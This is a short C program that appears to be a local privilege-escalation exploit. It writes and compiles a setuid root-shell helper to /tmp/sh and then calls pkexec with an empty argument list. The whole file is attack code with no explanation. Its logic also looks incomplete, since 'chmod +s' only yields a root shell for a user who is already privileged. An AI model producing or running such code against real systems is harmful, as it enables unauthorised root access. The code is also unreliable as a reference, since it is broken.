#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char *shell = 
"#include <stdio.h>\n"
"int main() {\n"
"setuid(0); setgid(0);\n"
"system(\"/bin/bash\");\n"
"return 0;\n"
"}\n";

int main() {
    FILE *fp = fopen("sh.c", "w");
    fputs(shell, fp);
    fclose(fp);
    system("gcc sh.c -o /tmp/sh; chmod +s /tmp/sh");
    char *args[] = { "pkexec", NULL };
    execvp("pkexec", args);
    return 0;
}

